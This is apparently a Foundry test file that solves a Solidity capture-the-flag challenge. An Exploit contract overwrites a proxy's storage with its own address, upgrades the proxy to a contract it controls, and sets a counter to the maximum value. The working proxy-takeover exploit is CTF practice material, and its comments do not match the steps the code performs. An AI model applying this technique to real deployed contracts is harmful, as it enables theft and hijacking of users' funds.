// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./Challenge.sol";

contract ChallengeTest is Test {
    Setup setup;
    address public playerAddress;

    function setUp() public {
        playerAddress = makeAddr("player");
        setup = new Setup();
        vm.deal(playerAddress, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(playerAddress, playerAddress);

        ////////// YOUR CODE GOES HERE //////////
        new Exploit(address(setup.counter())).exploit();
        ////////// YOUR CODE END //////////

        assertTrue(setup.isSolved(), "challenge not solved");
        vm.stopPrank();
    }
}

////////// YOUR CODE GOES HERE //////////
contract Exploit {
    Counter public counter;
    New public _new;
    constructor(address _counter) {
        counter = Counter(_counter) ;
        _new = new New();
    }
    function exploit () public {
        // 1. call upgradeTo() to set implAddr to address of Counter
        // 2. call increment() to increment number
        // 3. call setNumber() to set number to type(uint256).max
        counter.setNumber(uint256(uint160(address(this))));
        BadProxy(address(counter)).upgradeTo(address(_new));
        New(address(counter)).changeNum();

    }
}
contract New{
    uint256 public number;
    function changeNum() public {
        number=type(uint256).max;
    }
}
////////// YOUR CODE END //////////
